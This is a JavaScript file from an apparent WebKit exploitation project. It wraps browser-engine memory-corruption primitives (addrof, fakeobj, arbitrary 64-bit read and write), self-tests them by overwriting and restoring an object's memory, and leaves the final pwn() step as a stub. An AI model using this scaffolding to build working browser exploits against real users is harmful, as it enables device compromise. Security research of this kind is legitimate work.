/*
 * Copyright (C) 2018 Alexandro Luongo (w00dl3cs).
 */

function loadScript(script) {
    if (typeof(load) !== 'undefined') {
        var baseDirectory = "~/projects/exploitation/webkit_pwn/exploits/core/";
        load(baseDirectory + script);
    }
}

loadScript("ready.js");
loadScript("utils.js");
loadScript("int64.js");

var primitives = {
    addrof: function(obj) {
        var addr = addressOf(obj);
        return Int64.fromDouble(addr);
    },
    fakeobj: function(addr) {
        if (addr instanceof Int64)
            addr = addr.asDouble();

        return fakeObj(addr);
    },
    read64: function(where) {
        if (where instanceof Int64)
            where = where.asDouble();

        return Int64.fromDouble(read64(where));
    },
    write64: function(what, where) {
        if (what instanceof Int64)
            what = what.asDouble();

        if (where instanceof Int64)
            where = where.asDouble();

        write64(what, where);
    },
    test: function() {
        var obj = { a: 0x1337 };
        var objAddr = this.addrof(obj);
        var fakeObj = this.fakeobj(objAddr);

        if (fakeObj.a != obj.a)
            throw "addrof/fakeobj primitives are not working!";

        var objCell = this.read64(objAddr);
        var fakeObjCell = new Int64(obj.a);
        primitives.write64(fakeObjCell, objAddr);
        var newObjCell = primitives.read64(objAddr);

        if (newObjCell.toString() != fakeObjCell.toString())
            throw "read/write primitives are not working!"

        primitives.write64(objCell, objAddr);
    }
};

function init() {
    primitives.test();
}

function pwn() {
    print("Exploit me, daddy");
}

ready.then(function() {
    try {
        init();
        pwn();
    } catch (e) {
        print("[-] Exception caught: " + e);
    }
}).catch(function(err) {
    print("[-] Initialization failed");
});
